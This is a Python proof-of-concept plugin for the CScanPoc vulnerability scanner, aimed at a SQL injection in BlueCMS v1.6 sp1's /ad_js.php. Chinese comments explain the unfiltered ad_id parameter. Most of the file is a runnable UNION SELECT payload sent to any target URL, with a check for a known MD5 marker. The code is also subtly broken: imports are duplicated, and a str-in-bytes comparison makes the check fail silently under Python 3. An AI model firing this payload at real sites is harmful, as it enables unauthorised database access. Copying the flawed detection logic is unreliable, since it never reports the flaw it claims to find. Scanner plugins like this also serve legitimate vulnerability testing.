# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'BlueCMS_0101'  # 平台漏洞编号，留空
    name = 'BlueCMS v1.6 sp1 /ad_js.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''BlueCMS(地方分类信息门户专用CMS系统)
$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; //根目录下其他文件都做了很好的过滤，
对数字型变量几乎都用了intval()做限制，唯独漏了这个文件，居然只是用了trim()去除头尾空格。
$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); //直接代入查询。
    '''  # 漏洞描述
    ref = 'http://www.myhack58.com/Article/html/3/7/2010/27774_2.htm'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'BlueCMS'  # 漏洞应用名称
    product_version = '1.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7d51dc5d-390e-4b68-ba19-5f14c337bad5'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            try:
                content = urllib.request.urlopen(req).read()
            except Exception as e:
                content = ''
                return
            if '63e1f04640e83605c1d177544a5a0488' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
